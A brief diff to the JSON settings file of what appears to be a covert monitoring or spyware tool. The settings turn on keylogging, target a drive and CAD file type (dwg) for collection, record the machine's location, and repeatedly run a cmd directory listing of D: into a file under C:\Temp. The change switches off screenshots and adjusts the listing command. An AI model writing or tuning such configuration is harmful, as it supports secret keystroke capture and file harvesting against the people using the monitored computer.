@@ -14,10 +14,10 @@
   "_allcertainFilesInRootFolder":"d:\\",
   "_certainFileTypeInRootFolder":"dwg",
   "timeRepeatMinutes": 1,
-  "scrShot": true,
+  "_scrShot": true,
   "keyLog": true,
   "_pcCurrentLoc": true,
   "reloadconfigFile": true,
-  "cmdCommandsList": ["dir D:\\ /s /b >> \"C:\\Temp\\string2.txt\""],
+  "cmdCommandsList": ["dir D:\\ /q >> \"C:\\Temp\\string.txt\""],
   "repeatCmdCommands": true
 }
